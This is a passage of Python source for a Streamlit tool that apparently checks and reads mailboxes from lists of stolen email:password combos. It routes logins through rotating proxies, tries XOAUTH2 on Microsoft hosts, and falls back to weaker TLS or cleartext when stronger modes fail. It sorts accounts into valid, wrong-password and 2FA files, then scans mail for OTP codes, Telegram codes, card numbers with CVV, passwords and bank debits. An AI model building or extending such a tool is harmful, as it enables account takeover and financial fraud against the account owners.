    st.session_state.mb_log = st.session_state.mb_log[:50]
    save_session_cache()

def debug_log(msg):
    st.session_state.folder_debug_logs.append(msg)

def bot_log(msg):
    st.session_state.bot_diag_logs.append(msg)

def search_log(msg):
    st.session_state.search_diag_logs.append(msg)

def otp_log(msg):
    st.session_state.otp_diag_logs.append(msg)
# @@END 014


# @@BLOCK 015 TLS_AND_PROXY_PARSE deps=013
# ============================================================================
# CONNECTION LAYER
#
# The proxy IMAP classes override _create_socket(), NOT open(): on Python
# 3.13+ imaplib.IMAP4.file is a read-only property, so assigning self.file
# inside an open() override raises
#     property 'file' of '_ProxyIMAP4' object has no setter
# ============================================================================

def _cfg_verify() -> bool:
    """v13.39: the page's ALLOW_SELF_SIGNED setting, finally read.

    app_config["allow_self_signed"] existed in DEFAULT_APP_CONFIG and was used by
    NOTHING - both TLS rungs hardcoded verify=False.  Unticked now means a real
    verification, so an expired / mismatched certificate is actually rejected.
    """
    try:
        return not bool(st.session_state.app_config.get("allow_self_signed", True))
    except Exception:
        return False

def _mail_tls_context(verify=False):
    """verify=False tolerates self-signed / expired / hostname-mismatched certs."""
    if verify:
        ctx = _ssl.create_default_context()
    else:
        ctx = _ssl._create_unverified_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
    try:
        ctx.set_ciphers('DEFAULT:@SECLEVEL=1')   # old cPanel / SHA-1 / 1024-bit RSA
    except Exception:
        pass
    return ctx

def _parse_proxy_str(proxy_str):
    """Accepts host:port | host:port:user:pass | user:pass@host:port | scheme://..."""
    if not proxy_str or proxy_str == "direct":
        return None
    try:
        p = str(proxy_str).strip()
        scheme = None
        if "://" in p:
            scheme, p = p.split("://", 1)
            scheme = scheme.lower()

        user = pw = None
        if "@" in p:
            auth, p = p.rsplit("@", 1)
            if ":" in auth:
                user, pw = auth.split(":", 1)
            else:
                user = auth

        parts = p.split(":")
        host = None
        port = None
        try:
            if len(parts) >= 4:
                host, port, user, pw = parts[0], int(parts[1]), parts[2], ":".join(parts[3:])
            elif len(parts) == 3:
                host, port, extra = parts[0], int(parts[1]), parts[2]
                if user is None:
                    user, pw = extra, None
            elif len(parts) == 2:
                host, port = parts[0], int(parts[1])
            else:
                return None
        except (ValueError, IndexError):
            return None

        if not host or not port:
            return None
        return {"host": host, "port": port, "user": user or None, "pass": pw or None, "scheme": scheme}
    except Exception:
        return None
# @@END 015


# @@BLOCK 016 PROXY_PROBE deps=015
# ---------------------------------------------------------------------------
# v13.37: probe + rotate instead of blindly taking pool[0], and report the path
# ---------------------------------------------------------------------------
def _reader_proxy_reachable(proxy_str, host, port=993, timeout=5.0) -> bool:
    """True if a SOCKS5/HTTP CONNECT to host:port through this node succeeds."""
    info = _parse_proxy_str(proxy_str)
    if not info:
        return False
    try:
        import socks
    except ImportError:
        return False
    # v13.39: SOCKS5-only here binned every HTTP-only node while _raw_socket()
    # right below happily speaks HTTP.  Try both, like _raw_socket does.
    for _ptype in (socks.SOCKS5, socks.HTTP):
        try:
            s = socks.socksocket()
            s.set_proxy(_ptype, info["host"], info["port"],
                        username=info.get("user"), password=info.get("pass"),
                        rdns=True)
            s.settimeout(timeout)
            s.connect((host, int(port)))
            s.close()
            return True
        except Exception:
            continue
    return False

def _reader_proxy_str(host: str = ""):
    """Optional proxy for manual reader connections (sidebar toggle).

    v13.37: tries each pool entry against the real target host and returns the
    first one that connects, instead of returning pool[0] and hoping.
    Records the outcome in st.session_state["_reader_proxy_path"] so the UI can
    state the truth rather than guess.
    """
    try:
        if not st.session_state.get("reader_use_proxy", False):
            st.session_state["_reader_proxy_path"] = "direct (proxy toggle OFF)"
            return None
        pool = load_app_proxies()
        if not pool:
            st.session_state["_reader_proxy_path"] = "direct (no pool)"
            return None
        target = host or "imap.gmail.com"
        # v13.39: 8 nodes x 5s was up to 40s of stall before the reader even
        # connected.  5 x 3s is enough to find a live node.
        for item in pool[:5]:
            px = item.get("proxy")
            if not px:
                continue
            if _reader_proxy_reachable(px, target, 993, timeout=3.0):
                st.session_state["_reader_proxy_path"] = f"via {px} ({item.get('country')})"
                return px
        st.session_state["_reader_proxy_path"] = "direct (every probed node failed)"
        return None
    except Exception:
        st.session_state["_reader_proxy_path"] = "direct (probe error)"
        return None

def _conn_path() -> str:
    try:
        return st.session_state.get("_reader_proxy_path", "unknown")
    except Exception:
        return "unknown"
# @@END 016


# @@BLOCK 017 SOCKET_AND_IMAP deps=016
def _raw_socket(host, port, timeout, proxy_str=None):
    """Direct socket, or proxied via SOCKS5/HTTP. Falls back to direct if the
    proxy route dies, so a live mailbox is never lost to a dead proxy."""
    info = _parse_proxy_str(proxy_str)

    def _finish(s):
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        except Exception:
            pass
        s.settimeout(timeout)
        return s

    if not info:
        return _finish(socket.create_connection((host, int(port)), timeout=timeout))

    try:
        import socks
    except ImportError:
        return _finish(socket.create_connection((host, int(port)), timeout=timeout))

    scheme = (info.get("scheme") or "").lower()
    if scheme.startswith("socks"):
        order = (socks.SOCKS5, socks.HTTP)
    elif scheme.startswith("http"):
        order = (socks.HTTP, socks.SOCKS5)
    else:
        order = (socks.SOCKS5, socks.HTTP)

    last = None
    for ptype in order:
        try:
            kw = {
                "proxy_type": ptype,
                "proxy_addr": info["host"],
                "proxy_port": info["port"],
                "proxy_rdns": True,          # let the proxy resolve DNS
            }
            if info["user"]:
                kw["proxy_username"] = info["user"]
                kw["proxy_password"] = info["pass"]
            return _finish(socks.create_connection((host, int(port)), timeout=timeout, **kw))
        except Exception as e:
            last = e

    # Last resort: go direct rather than losing the mailbox entirely.
    try:
        return _finish(socket.create_connection((host, int(port)), timeout=timeout))
    except Exception:
        raise last or RuntimeError(f"proxy connect failed for {host}:{port}")

def _ensure_file(m):
    """Belt-and-braces: make sure m.file is readable on every Python version."""
    try:
        if getattr(m, "file", None) is not None:
            return
    except Exception:
        pass
    try:
        m.file = m.sock.makefile("rb")
        return
    except Exception:
        pass
    try:
        m._file = m.sock.makefile("rb")
    except Exception:
        pass

class _ProxyIMAP4SSL(imaplib.IMAP4_SSL):
    """Implicit-TLS IMAP that routes through the proxy and uses an unverified
    context by default. Overrides _create_socket(), NOT open()."""

    def __init__(self, host, port=993, timeout=None, proxy_str=None, verify=False):
        self._proxy_str = proxy_str
        self._verify = verify
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        raw = _raw_socket(self.host, self.port, timeout, self._proxy_str)
        return _mail_tls_context(self._verify).wrap_socket(raw, server_hostname=self.host)

class _ProxyIMAP4(imaplib.IMAP4):
    """Plain IMAP (STARTTLS-capable) with proxy support."""

    def __init__(self, host, port=143, timeout=None, proxy_str=None):
        self._proxy_str = proxy_str
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return _raw_socket(self.host, self.port, timeout, self._proxy_str)

class _XOAUTH2IMAP4SSL(_ProxyIMAP4SSL):
    """Adapter so ms_oauth's uniform `insecure=` kwarg reaches _ProxyIMAP4SSL,
    which spells the same flag `verify=`."""

    def __init__(self, host, port=993, timeout=None, proxy_str=None, insecure=True):
        super().__init__(host, port=port, timeout=timeout,
                         proxy_str=proxy_str, verify=not insecure)

def open_imap(host, port, timeout, proxy_str=None, try_starttls=None):
    """v13.37: the ladder is built from the CONFIGURED port.

    Before, the STARTTLS and plaintext rungs were gated on int(port) == 993, so
    a port-143 account dialled implicit TLS on 143 and then gave up entirely.
    The plaintext rung still matters: legacy / Zimbra servers answer
    'TLS not supported by server' on 143 but accept a cleartext LOGIN.

    v13.39: the certificate policy comes from app_config["allow_self_signed"]
    instead of being hardcoded to verify=False in both rungs.
    """
    if try_starttls is None:
        try_starttls = bool(st.session_state.app_config.get("try_starttls", True))
    _verify = _cfg_verify()

    port = int(port or 993)
    if port == 143:
        ladder = [("starttls", 143), ("plain", 143), ("implicit", 993)]
    else:
        ladder = [("implicit", port), ("starttls", 143), ("plain", 143)]

    last = None
    for mode, p in ladder:
        try:
            if mode == "implicit":
                m = _ProxyIMAP4SSL(host, p, timeout=timeout, proxy_str=proxy_str, verify=_verify)
            else:
                m = _ProxyIMAP4(host, p, timeout=timeout, proxy_str=proxy_str)
                if mode == "starttls" and try_starttls:
                    m.starttls(ssl_context=_mail_tls_context(_verify))
                elif mode == "starttls" and not try_starttls:
                    continue
            _ensure_file(m)
            return m
        except Exception as e:
            last = e

    raise last or RuntimeError(f"open_imap failed for {host}:{port}")
# @@END 017


# @@BLOCK 018 ERROR_SNIFFERS deps=017
def _looks_like_auth_error(err_text: str) -> bool:
    s = (err_text or "").lower()
    return any(k in s for k in (
        "authenticationfailed", "authentication failed", "invalid credentials",
        "invalid login", "invalid password", "invalid user", "login failed",
        "auth failed", "[auth]", "username and password not accepted",
        "logon failure", "bad username", "authenticate failed",
    ))

def _looks_like_login_drop(err_text: str) -> bool:
    """v13.39: the reader had no idea about the * BYE the engine learned in
    v13.38, so a server that answered then hung up was filed as plain FAILED."""
    s = (err_text or "").lower()
    if any(k in s for k in ("too many", "limit", "quota", "busy", "throttle")):
        return False                       # that is a rate cap, not a drop
    return any(k in s for k in (
        "terminating connection", "imap server terminating", "server terminating",
        "* bye", " bye ", "auth process broken", "connection is closed",
        "server closed the connection", "server dropped the connection",
    ))

def _looks_like_app_password_error(err_text: str) -> bool:
    s = (err_text or "").lower()
    return any(k in s for k in (
        "application-specific password", "app password", "app-password",
        "app password required", "basic authentication is disabled",
        "web login required", "log in via your web browser", "web browser",
        "logindisabled", "login disabled", "two-factor", "2fa", "mfa",
        "enable imap", "imap access is disabled",
    ))

def _looks_like_network_error(err_text: str) -> bool:
    s = (err_text or "").lower()
    return any(k in s for k in (
        "proxy connect", "proxy authentication", "proxy auth", "proxyconnect",
        "407", "timed out", "timeout", "connection refused", "connection reset",
        "network is unreachable", "name or service not known", "gaierror",
        "reset by peer", "broken pipe", "no route to host", "unreachable",
        "bad file descriptor", "eof occurred", "unexpected_eof",
        "wrong version number", "certificate verify failed", "hostname mismatch",
        "self signed certificate", "self-signed certificate", "too many",
        "rate limit", "throttl", "no setter", "dns",
    ))
# @@END 018


# @@BLOCK 019 VALID_STORAGE deps=018
# ============================================================================
# VALID ACCOUNT STORAGE  (v13.37: mtime cache + real merge)
# ============================================================================
_VALID_FILE_PATTERNS = [
    "mail_results/*valid*.txt",
    "mail_results/*clean*.txt",
    "*valid*.txt",
    "*clean*.txt",
    "manual_valid_accounts.txt"
]
_VALID_IGNORE = ["resume", "unfinished", "remaining", "input", "proxies", "proxy", "config", "blocklist"]
_VALID_CACHE = {"fp": None, "options": None}   # v13.37


def _valid_files() -> List[str]:
    files = []
    for pat in _VALID_FILE_PATTERNS:
        files.extend(glob.glob(pat, recursive=True))
    out = []
    for p in dict.fromkeys(files):
        if not os.path.isfile(p):
            continue
        low = os.path.basename(p).lower()
        if any(kw in low for kw in _VALID_IGNORE) or low == LAST_ACCOUNT_FILE:
            continue
        out.append(p)
    return out


def _valid_fingerprint():
    """v13.37: (path, mtime) for every candidate file — cheap change detector."""
    fp = []
    for p in _valid_files():
        try:
            fp.append((p, os.path.getmtime(p), os.path.getsize(p)))
        except Exception:
            continue
    return tuple(sorted(fp))


def load_valid():
    """Optimized instant loader: scans only valid text result files, bypassing
    heavy log scanning.  v13.37: cached until one of those files changes."""
    fp = _valid_fingerprint()
    if _VALID_CACHE["fp"] == fp and _VALID_CACHE["options"] is not None:
        return list(_VALID_CACHE["options"])

    valid_map = {}
    for path in _valid_files():
        try:
            file_mtime = datetime.fromtimestamp(os.path.getmtime(path))
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    clean_combo = line.split("|")[0].replace(" ", "").strip('"\'')
                    if ":" not in clean_combo:
                        continue
                    parts = clean_combo.split(":", 1)
                    email_part = parts[0].strip().lower()
                    pwd_part = parts[1].strip()
                    if "@" not in email_part or "." not in email_part or not pwd_part:
                        continue
                    combo_str = f"{email_part}:{pwd_part}"
                    if email_part not in valid_map or file_mtime > valid_map[email_part][0]:
                        valid_map[email_part] = (file_mtime, combo_str)
        except Exception:
            continue

    sorted_items = sorted(valid_map.values(), key=lambda x: x[0], reverse=True)
    options = []
    for file_mtime, combo_str in sorted_items:
        time_label = f"# Found: {file_mtime.strftime('%Y-%m-%d %H:%M:%S')}"
        options.append(time_label)
        options.append(combo_str)

    options = options if options else ["none"]
    _VALID_CACHE["fp"] = fp
    _VALID_CACHE["options"] = options
    return list(options)


def merge_into_clean_valid(new_combo_lines: List[str]) -> int:
    """v13.37: MERGE into clean_valid_accounts.txt, deduped by email.

    The engine used to OVERWRITE this file while this page PREPENDED to it, so a
    batch import was destroyed by the next engine run (and vice versa).
    Returns the number of unique accounts now stored.
    """
    merged = {}
    target = "clean_valid_accounts.txt"
    try:
        if os.path.exists(target):
            with open(target, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    em = line.split("|")[0].split(":")[0].strip().lower()
                    if "@" in em:
                        merged[em] = line
    except Exception:
        pass
    for line in new_combo_lines:
        em = line.split("|")[0].split(":")[0].strip().lower()
        if "@" in em:
            merged[em] = line
    tmp = target + ".tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            f.write("# email:password  (merged by the reader, newest wins)\n")
            for em in sorted(merged):
                f.write(merged[em] + "\n")
        os.replace(tmp, target)
    except Exception:
        pass
    _VALID_CACHE["fp"] = None
    return len(merged)


def delete_specific_account_from_storage(target_combo: str):
    search_files = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
    for path in search_files:
        filename_lower = os.path.basename(path).lower()
        if filename_lower == LAST_ACCOUNT_FILE or any(kw in filename_lower for kw in ["resume", "unfinished", "remaining", "input", "proxies", "proxy", "config", "blocklist"]):
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            new_lines = []
            for line in lines:
                combo = line.split("|")[0].strip()
                if combo != target_combo:
                    new_lines.append(line)
            with open(path, "w", encoding="utf-8") as f:
                f.writelines(new_lines)
        except Exception:
            pass
    if load_last_account() == target_combo:
        if os.path.exists(LAST_ACCOUNT_FILE):
            try:
                os.remove(LAST_ACCOUNT_FILE)
            except Exception:
                pass
    _VALID_CACHE["fp"] = None

def clear_all_valid_accounts_storage():
    search_files = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
    for path in search_files:
        filename_lower = os.path.basename(path).lower()
        if "valid" not in filename_lower and "clean" not in filename_lower:
            continue
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write("")
        except Exception:
            pass
    if os.path.exists(LAST_ACCOUNT_FILE):
        try:
            os.remove(LAST_ACCOUNT_FILE)
        except Exception:
            pass
    _VALID_CACHE["fp"] = None
# @@END 019


# @@BLOCK 020 ZIP_CACHE deps=019
_ZIP_CACHE = {"fp": None, "blob": None}        # v13.37


def generate_all_mail_zip():
    """v13.37: cached on the same (path, mtime) fingerprint as load_valid()."""
    fp = _valid_fingerprint() + tuple(sorted(
        (p, os.path.getmtime(p)) for p in (glob.glob("mail_results/*.txt") + glob.glob("*.txt"))
        if os.path.isfile(p)))
    if _ZIP_CACHE["fp"] == fp and _ZIP_CACHE["blob"] is not None:
        return _ZIP_CACHE["blob"]

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        search_paths = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
        added_files = set()
        added_arcnames = set()

        for path in search_paths:
            filename = os.path.basename(path)
            filename_lower = filename.lower()
            if filename in added_files or filename == LAST_ACCOUNT_FILE or any(kw in filename_lower for kw in ["resume", "unfinished", "remaining"]):
                continue
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    clean_lines = []
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        if ":" in line:
                            combo = line.split("|")[0].strip()
                            if ":" in combo:
                                clean_lines.append(combo)

                count = len(clean_lines)
                if count == 0:
                    continue

                if "valid" in filename_lower or "clean" in filename_lower:
                    cat_name = f"Clean_Valid_{count}.txt"
                elif "wrong" in filename_lower or "pass" in filename_lower:
                    cat_name = f"Wrong_Password_{count}.txt"
                elif "app" in filename_lower or "2fa" in filename_lower or "otp" in filename_lower:
                    cat_name = f"App_Password_2FA_{count}.txt"
                elif "fail" in filename_lower or "conn" in filename_lower:
                    cat_name = f"Connection_Failed_{count}.txt"
                else:
                    base_wo_ext = os.path.splitext(filename)[0]
                    cat_name = f"{base_wo_ext}_{count}.txt"

                # Two source files can map to the SAME category+count (e.g. two
                # different valid_*.txt with 13 rows each). Suffix until unique
                # so ZipFile stops warning about a duplicate name.
                if cat_name in added_arcnames:
                    stem, ext = os.path.splitext(cat_name)
                    n = 2
                    while f"{stem}_{n}{ext}" in added_arcnames:
                        n += 1
                    cat_name = f"{stem}_{n}{ext}"
                added_arcnames.add(cat_name)

                file_content = "\n".join(clean_lines)
                zf.writestr(cat_name, file_content)
                added_files.add(filename)
            except Exception:
                continue
    blob = buf.getvalue()
    _ZIP_CACHE["fp"] = fp
    _ZIP_CACHE["blob"] = blob
    return blob
# @@END 020


# @@BLOCK 021 MIME_AND_PORTAL deps=019
def decode_hdr(value):
    try:
        out = []
        for part, enc in decode_header(value or ""):
            out.append(part.decode(enc or "utf-8", errors="ignore") if isinstance(part, bytes) else str(part))
        return "".join(out)
    except Exception:
        return str(value or "")

def get_webmail_portal(email_addr):
    if "@" not in email_addr:
        return "https://mail.google.com"
    domain = email_addr.split("@")[-1].lower()
    portals = {
        "gmail.com": "https://mail.google.com",
        "googlemail.com": "https://mail.google.com",
        "outlook.com": "https://outlook.live.com",
        "hotmail.com": "https://outlook.live.com",
        "live.com": "https://outlook.live.com",
        "yahoo.com": "https://mail.yahoo.com",
        "ymail.com": "https://mail.yahoo.com",
        "icloud.com": "https://www.icloud.com/mail",
        "me.com": "https://www.icloud.com/mail",
        "aol.com": "https://mail.aol.com",
        "zoho.com": "https://mail.zoho.com",
        "proton.me": "https://mail.proton.me",
        "protonmail.com": "https://mail.proton.me",
        "montevideo.com.uy": "https://webmail.montevideo.com.uy",
    }
    return portals.get(domain, f"https://www.{domain}")
# @@END 021


# @@BLOCK 022 IMAP_UTF7 deps=021
_B64_MEMO = {}                                  # v13.37: decode memoisation


def decode_imap_utf7(s: str) -> str:
    if "&" not in s:
        return s
    hit = _B64_MEMO.get(s)
    if hit is not None:
        return hit
    res = []
    for part in s.split("&"):
        if "-" in part and not part.startswith("-"):
            b64_str, rest = part.split("-", 1)
            if b64_str == "":
                res.append("&" + rest)
            else:
                try:
                    b64_padded = b64_str.replace(",", "/") + "=" * ((4 - len(b64_str) % 4) % 4)
                    decoded = base64.b64decode(b64_padded).decode("utf-16be")
                    res.append(decoded + rest)
                except Exception:
                    res.append("&" + part)
        else:
            res.append(part)
    out = "".join(res)
    if len(_B64_MEMO) < 4096:
        _B64_MEMO[s] = out
    return out

def encode_imap_utf7(s: str) -> str:
    parts = []
    i = 0
    while i < len(s):
        char = s[i]
        if 0x20 <= ord(char) <= 0x7E:
            if char == '&':
                parts.append('&-')
            else:
                parts.append(char)
            i += 1
        else:
            start = i
            while i < len(s) and not (0x20 <= ord(s[i]) <= 0x7E):
                i += 1
            chunk = s[start:i]
            utf16 = chunk.encode('utf-16be')
            b64 = base64.b64encode(utf16).decode('ascii')
            mod_b64 = b64.replace('/', ',').rstrip('=')
            parts.append(f'&{mod_b64}-')
    return "".join(parts)

def clean_display_label(folder_name: str) -> str:
    upper_name = folder_name.upper()
    if upper_name == "INBOX":
        return "INBOX"
    if upper_name.startswith("INBOX.") or upper_name.startswith("INBOX/"):
        return folder_name[6:]
    return folder_name

def parse_imap_list_line(s: str) -> Tuple[str, str, str]:
    s = s.strip()
    flags, delim, raw_name = "", '".', s
    if s.startswith("("):
        end_paren = s.find(")")
        if end_paren != -1:
            flags = s[1:end_paren].strip()
            remainder = s[end_paren + 1:].strip()
            parts = remainder.split(None, 1)
            if len(parts) >= 1:
                delim = parts[0]
            raw_name = parts[1].strip() if len(parts) == 2 else ""

    if raw_name.startswith('"') and raw_name.endswith('"') and len(raw_name) >= 2:
        raw_name = raw_name[1:-1].replace('\\"', '"')

    return flags, delim, raw_name

def get_imap_path(selected_ui_folder: str) -> str:
    folder_map = st.session_state.get("folder_map", {})
    return folder_map.get(selected_ui_folder, selected_ui_folder)
# @@END 022


# @@BLOCK 023 FOLDERS deps=022
def list_folders(mail, email_addr: str = "", host_val: str = ""):
    found = set()
    st.session_state.folder_debug_logs = []
    debug_log(f"📧 [TARGET ACCOUNT] Email: '{email_addr}' | Host: '{host_val}'")
    debug_log("🔍 [ENGINE START] Issuing IMAP command: LIST '' '*'")

    try:
        typ, data = mail.list('""', "*")
        debug_log(f"📡 [RESPONSE STATUS] Server Response Code: '{typ}' | Raw Records Count: {len(data) if data else 0}")
        if typ == "OK" and data:
            for idx, item in enumerate(data, 1):
                if not item:
                    continue
                try:
                    s = item.decode("latin1", errors="ignore") if isinstance(item, bytes) else str(item)
                    s = s.strip()
                    debug_log(f"\n  ├─ [Line #{idx} Raw]: {s}")
                    flags, delim, clean_name = parse_imap_list_line(s)
                    flags_lower = flags.lower()

                    if r"\noselect" in flags_lower or r"\nonexistent" in flags_lower:
                        debug_log("  │   └─ ⚠️ FILTERED OUT: Flagged as \\Noselect or \\Nonexistent")
                        continue

                    if clean_name and clean_name not in (".", "/", '""', "''"):
                        decoded_folder = decode_imap_utf7(clean_name)
                        ui_label = clean_display_label(decoded_folder)
                        found.add(decoded_folder)
                        debug_log(f"  │   └─ ✅ ACCEPTED FOLDER: Raw='{decoded_folder}' -> UI='{ui_label}'")
                except Exception as line_ex:
                    debug_log(f"  │   └─ ⚠️ PARSE ERROR: {line_ex}")
                    continue
    except Exception as ex:
        debug_log(f"❌ [EXCEPTION ERROR] Folder enumeration failed: {ex}")

    if not found:
        found.add("INBOX")

    sorted_raw = sorted(list(found), key=lambda x: (0 if x.lower() == "inbox" else 1, clean_display_label(x).lower()))
    folder_map, display_folders = {}, []
    for raw_f in sorted_raw:
        label = clean_display_label(raw_f)
        folder_map[label] = raw_f
        display_folders.append(label)

    st.session_state.folder_map = folder_map
    save_session_cache()
    return display_folders
# @@END 023


# @@BLOCK 024 LOGIN deps=023
def connect_and_login(host, port, timeout, proxy_str, users, password, email_addr):
    """Log in on ONE host.  Microsoft hosts go over XOAUTH2 first.

    v13.37: a definitive Microsoft answer (MsTokenRejected.verdict) is no longer
    thrown away.  It raises MsVerdict("WRONG"|"APPASS") so the caller stops
    host-hopping and reports the truth instead of falling through to basic auth
    and labelling a known-wrong password as APPASS.

    Returns an OPEN logged-in mailbox, or raises the last error.
    """
    if _MS_OAUTH_OK and (host or "").lower() in _MS_IMAP_HOSTS:
        try:
            mail, _exists, _claims = _ms_oauth.imap_xoauth2_open(
                email_addr, password, host, _XOAUTH2IMAP4SSL,
                port=port, proxy_str=proxy_str,
                insecure=not _cfg_verify(), attempt_timeout=timeout)
            return mail
        except _ms_oauth.MsTokenTransport:
            pass                              # network blip -> fall through to basic auth
        except _ms_oauth.MsTokenRejected as trej:      # v13.37
            _verdict = getattr(trej, "verdict", "")
            _code = getattr(trej, "code", "?")
            if _verdict == "wrong_password":
                raise MsVerdict("WRONG", f"XOAUTH2 {_code} -> wrong password")
            if _verdict == "need_app_password":
                raise MsVerdict("APPASS", f"XOAUTH2 {_code} -> MFA, app password required")
            # unknown verdict -> fall through to basic auth
        except MsVerdict:
            raise
        except Exception:
            pass

    last_err = None
    for user in users:
        mail = None
        try:
            mail = open_imap(host, port, timeout, proxy_str=proxy_str)
            mail.login(user, password)
            return mail
        except Exception as ex:
            last_err = ex
            if mail:
                try:
                    mail.logout()
                except Exception:
                    pass
            s = str(ex).lower()
            if not _looks_like_auth_error(s) and not _looks_like_app_password_error(s):
                break                          # host-level failure: user is irrelevant
    raise last_err or RuntimeError(f"login failed for {email_addr}")

def open_mail(email_addr, password_val, host_val, timeout=None, proxy_str=None):
    """Connect + login.  Tries the full address first, then the bare local part,
    because legacy ISP servers authenticate on the local part only.  Microsoft
    hosts are handled over XOAUTH2 inside connect_and_login()."""
    if timeout is None:
        timeout = st.session_state.app_config.get("connection_timeout", 60)
    port_val = st.session_state.app_config.get("imap_port", 993)
    if proxy_str is None:
        proxy_str = _reader_proxy_str(host_val)

    users = username_candidates(email_addr)
    return connect_and_login(host_val, port_val, timeout, proxy_str,
                             users, password_val, email_addr)

def resolve_active_host(email_addr: str) -> str:
    """Single source of truth for 'which host is this session bound to'."""
    ov = st.session_state.get("custom_host", "").strip()
    if ov:
        return ov
    mh = st.session_state.get("mb_host", "")
    if mh:
        return mh
    cands = candidate_hosts(email_addr) if email_addr else []
    return cands[0] if cands else ""

def get_active_mail(email_addr, password_val, host_val):
    current_combo = f"{email_addr}:{password_val}"
    if st.session_state.get("connected_account_combo") != current_combo or not st.session_state.get("active_mail"):
        if st.session_state.active_mail:
            try:
                st.session_state.active_mail.logout()
            except Exception:
                pass
            st.session_state.active_mail = None

        try:
            st.session_state.active_mail = open_mail(email_addr, password_val, host_val)
            st.session_state.connected_account_combo = current_combo
            save_session_cache()
        except Exception as ex:
            st.session_state.active_mail = None
            raise ex
    else:
        try:
            st.session_state.active_mail.noop()
        except Exception:
            try:
                st.session_state.active_mail = open_mail(email_addr, password_val, host_val)
                save_session_cache()
            except Exception as ex:
                st.session_state.active_mail = None
                raise ex

    return st.session_state.active_mail

def move_message(mail, src_folder_label, mid, dst_folder_label):
    """Correct COPY+DELETE: source folder must be selected for COPY to work."""
    src = encode_imap_utf7(get_imap_path(src_folder_label))
    dst = encode_imap_utf7(get_imap_path(dst_folder_label))

    typ, data = mail.select(f'"{src}"', readonly=False)
    if typ != "OK":
        raise RuntimeError(f"Cannot select source folder '{src_folder_label}': {data}")

    typ, data = mail.copy(mid, f'"{dst}"')
    if typ != "OK":
        raise RuntimeError(f"COPY to '{dst_folder_label}' failed: {typ} {data}")

    mail.store(mid, '+FLAGS', '\\Deleted')
    mail.expunge()
# @@END 024


# @@BLOCK 025 CLASSIFY_CONTENT deps=024
def is_extortion_spam(subject: str, body: str, frm: str = "") -> bool:
    extortion_keywords = [
        "bitcoin wallet", "transfer me", "deactivate and remove all malware",
        "posted to the public", "recorded all your actions", "trojan",
        "remote control function", "my servers", "pay bitcoin", "ransom"
    ]
    combined = f"{subject} {body} {frm}".lower()
    return any(kw in combined for kw in extortion_keywords)

def detect_specific_categories(subject: str, body: str, frm: str = "", pins=None, cards=None, creds=None) -> List[str]:
    if is_extortion_spam(subject, body, frm):
        return []

    categories = []
    combined = f"{subject} {body} {frm}".lower()
    pins = pins or []
    cards = cards or []
    creds = creds or []

    otp_kws = ["otp", "verification", "verify", "verification code", "auth code", "confirm code", "pin", "security code", "code", "confirmation code"]
    if pins or any(kw in combined for kw in otp_kws):
        categories.append("🔑 OTP / CODE")

    tg_kws = ["telegram", "t.me", "tg", "telegram code", "telegram notification", "telegram alert"]
    if any(kw in combined for kw in tg_kws):
        categories.append("📱 TELEGRAM")

    bl_kws = ["blacklist", "blacklisted", "banned", "blocked", "spam list", "denylist"]
    if any(kw in combined for kw in bl_kws):
        categories.append("🚫 BLACKLIST / BAN")

    card_kws = ["cvv", "exp date", "debit", "bank debit", "online purchase", "card ending", "debited by", "debit alert"]
    if cards or any(kw in combined for kw in card_kws):
        categories.append("💳 CARD / DEBIT")

    gen_bot_kws = ["password reset", "security alert", "mcafee", "credential", "application password", "tracking number", "purchase order", "po #"]
    if creds or (not categories and any(kw in combined for kw in gen_bot_kws)):
        categories.append("🤖 BOT MSG")

    return categories

def extract_pins_and_links(text):
    pins = []
    for m in re.finditer(r'(?i)(code|otp|pin|passcode|verification|verify)[^\d]{0,12}(\d{4,8})', text or ""):
        num = m.group(2)
        if num.startswith(("19", "20")) and len(num) == 4:
            continue
        if num in {"0000", "1234", "1111"}:
            continue
        pins.append(num)
    urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', text or "")
    cleaned_urls = [u for u in urls if not any(x in u.lower() for x in ["w3.org", "schema.org", "apple.com/DTDs"])]
    return list(dict.fromkeys(pins)), list(dict.fromkeys(cleaned_urls))

def extract_credentials_and_cards(text):
    card_pattern = r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:[0-9]{4}[ -]?){3}[0-9]{4})\b'
    cards = re.findall(card_pattern, text)
    cleaned_cards = [c.replace(" ", "").replace("-", "") for c in cards]

    card_exp = re.findall(r'(?i)(?:exp(?:iry|iration)?|valid thru|exp date)\s*[:=]?\s*(\d{2}/\d{2,4})', text)
    card_cvv = re.findall(r'(?i)(?:cvv2?|cvc|security code|cid)\s*[:=]?\s*(\d{3,4})', text)

    formatted_cards = []
    for c in cleaned_cards:
        detail = f"Card: {c}"
        if card_exp:
            detail += f" | EXP: {card_exp[0]}"
        if card_cvv:
            detail += f" | CVV: {card_cvv[0]}"
        formatted_cards.append(detail)

    cred_patterns = re.findall(r'(?i)(?:password|passwd|login|credentials|app password|gift card)\s*[:=]\s*(\S+)', text)

    debit_sources = []
    bank_debits = re.findall(r'(?i)(?:debited by|debit alert|account debited|bank debit|withdrawn from|amt debited)\s*[:=]?\s*([^\n\r,.]+)', text)
    if bank_debits:
        debit_sources.append(f"Bank Debit: {bank_debits[0].strip()}")

    online_debits = re.findall(r'(?i)(?:online purchase|payment to|paid to|merchant|transaction at)\s*[:=]?\s*([^\n\r,.]+)', text)
    if online_debits:
